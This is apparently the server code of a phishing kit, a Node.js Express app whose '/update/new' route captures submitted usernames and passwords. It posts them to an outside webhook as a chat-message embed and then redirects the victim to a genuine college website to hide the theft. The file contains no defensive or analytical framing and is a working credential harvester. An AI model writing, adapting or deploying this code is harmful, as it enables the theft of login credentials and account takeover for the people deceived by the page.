// index.js
const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));

const express = require('express');
const app = express();


app.set('view engine', 'ejs');
app.use(express.static('public'));
app.use(express.urlencoded({ extended: true }));

app.get('/', (req, res) => {
  res.render('main', { link: '' });
});



app.post('/update/new', async (req, res) => {
  try {
    const username = req.body.username;
    const password = req.body.password;

    const webhookURL = process.env['hook'];
    const message = {
      content: 'New form submission',
      embeds: [
        {
          title: 'Form Submission',
          fields: [
            {
              name: 'Username',
              value: username,
            },
            {
              name: 'Password',
              value: password,
            },
          ],
        },
      ],
    };

    await fetch(webhookURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(message),
    });

    res.redirect('https://fcrit.ac.in/');
  } catch (err) {
    console.error(err);
    res.status(500).render('error', { message: 'Internal Server Error' });
  }
});


app.listen(3000, () => {
  console.log('Server is running on port 3000');
  console.log('Made By Ξᴛʜᴀɴ');
});

process.on('unhandledRejection', (reason, p) => {
  console.log(' [antiCrash] :: Unhandled Rejection/Catch');
  console.log(reason, p);
});
process.on('uncaughtException', (err, origin) => {
  console.log(' [antiCrash] :: Uncaught Exception/Catch');
  console.log(err, origin);
});
process.on('uncaughtExceptionMonitor', (err, origin) => {
  console.log(' [antiCrash] :: Uncaught Exception/Catch (MONITOR)');
  console.log(err, origin);
});
process.on('multipleResolves', (type, promise, reason) => {
  console.log(' [antiCrash] :: Multiple Resolves');
  console.log(type, promise, reason);
});